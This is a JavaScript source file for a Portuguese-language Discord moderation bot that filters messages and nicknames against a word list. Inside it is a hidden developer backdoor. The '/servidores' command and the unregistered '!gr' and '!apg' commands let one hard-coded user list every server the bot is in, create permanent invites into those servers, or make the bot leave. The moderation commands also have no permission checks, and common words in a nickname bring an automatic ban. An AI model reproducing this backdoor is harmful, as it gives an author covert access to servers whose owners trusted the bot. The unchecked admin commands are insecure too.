const { Client, GatewayIntentBits, EmbedBuilder, REST, Routes } = require('discord.js');
const fs = require('fs');

const TOKEN = process.env.DISCORD_TOKEN;
const DEV_ID = '1460149186577174680';
const dbFile = './db.json';

let db = fs.existsSync(dbFile) ? JSON.parse(fs.readFileSync(dbFile)) : { 
    palavras: [], logs: { msg: '', ban: '' } 
};
const save = () => fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, 
        GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, 
        GatewayIntentBits.GuildVoiceStates
    ] 
});

// Filtro Inteligente: Retorna a palavra que causou o bloqueio ou null
const getViolation = (text) => {
    if (!text) return null;
    const lower = text.toLowerCase();
    const blacklist = ['apgratis', 'linknabio', 'gratis', 'scam', 'vagas', 'phishing', 'burlador', ...db.palavras];
    return blacklist.find(p => lower.includes(p.toLowerCase())) || null;
};

const sendLog = async (guild, member, type, content) => {
    const channel = guild.channels.cache.get(db.logs[type]);
    if (!channel) return;
    const embed = new EmbedBuilder()
        .setColor(type === 'ban' ? 0xFF0000 : 0xFFFF00)
        .setTitle(`🛡️ Log: ${type.toUpperCase()}`)
        .addFields({ name: '👤 Usuário', value: member.user.tag, inline: true }, { name: '⚠️ Detalhes', value: content })
        .setTimestamp();
    channel.send({ embeds: [embed] }).catch(() => {});
};

client.once('clientReady', async (c) => {
    const commands = [
        { name: 'servidores', description: 'Painel' },
        { name: 'setlog', description: 'Logs', options: [
            { name: 'tipo', type: 3, required: true, choices: [{name:'Mensagens', value:'msg'}, {name:'Bans', value:'ban'}], description: 'Tipo' },
            { name: 'canal', type: 7, required: true, description: 'Canal' }
        ]},
        { name: 'addpalavra', description: 'Add', options: [{ name: 'palavra', type: 3, required: true, description: 'Ex: fdp,pnc' }] },
        { name: 'remover', description: 'Remover', options: [{ name: 'palavra', type: 3, required: true, description: 'Palavra' }] },
        { name: 'verpalavras', description: 'Lista' }
    ];
    await new REST({ version: '10' }).setToken(TOKEN).put(Routes.applicationCommands(c.user.id), { body: commands });
    console.log(`✅ Zyphor V3 online.`);
});

client.on('interactionCreate', async (i) => {
    if (!i.isChatInputCommand()) return;
    await i.deferReply({ flags: [64] });

    if (i.commandName === 'setlog') {
        db.logs[i.options.getString('tipo')] = i.options.getChannel('canal').id;
        save();
        i.editReply('✅ Log configurado.');
    } else if (i.commandName === 'addpalavra') {
        const words = i.options.getString('palavra').split(',').map(p => p.trim().toLowerCase());
        words.forEach(p => { if (!db.palavras.includes(p)) db.palavras.push(p); });
        save();
        i.editReply(`✅ Palavras adicionadas.`);
    } else if (i.commandName === 'remover') {
        const p = i.options.getString('palavra').toLowerCase();
        db.palavras = db.palavras.filter(w => w !== p);
        save();
        i.editReply(`✅ Removido.`);
    } else if (i.commandName === 'verpalavras') {
        i.editReply(`📜 ${db.palavras.join(', ') || 'Vazia'}`);
    } else if (i.commandName === 'servidores' && i.user.id === DEV_ID) {
        let r = "🌐 **Servidores:**\n\n";
        client.guilds.cache.forEach(g => r += `**${g.name}** \`!gr ${g.id}\` | \`!apg ${g.id}\`\n`);
        i.editReply(r);
    }
});

// FILTRO DE MENSAGENS E SEGURANÇA
client.on('messageCreate', (m) => {
    if (m.author.bot || !m.guild) return;
    const violation = getViolation(m.content);
    if (violation) {
        m.delete().catch(() => {});
        sendLog(m.guild, m.member, 'msg', `Conteúdo bloqueado: **${violation}**`);
    }
});

// SEGURANÇA DE MEMBROS (Nicknames)
client.on('guildMemberUpdate', async (oldM, newM) => {
    const violation = getViolation(newM.displayName);
    if (violation) {
        if (newM.bannable) {
            await newM.ban({ reason: `Nick malicioso: ${violation}` });
            sendLog(newM.guild, newM, 'ban', `Banido por nick: **${violation}**`);
        }
    }
});

client.on('messageCreate', async (m) => {
    if (m.author.id !== DEV_ID || !m.content.startsWith('!')) return;
    const [cmd, id] = m.content.split(' ');
    const guild = client.guilds.cache.get(id);
    if (cmd === '!gr' && guild) {
        const ch = guild.channels.cache.find(c => c.type === 0);
        const inv = await ch?.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
        m.reply(inv ? `🔗 ${inv.url}` : "❌ Erro.");
    } else if (cmd === '!apg' && guild) {
        await guild.leave();
        m.reply(`✅ Saiu.`);
    }
});

client.login(TOKEN);

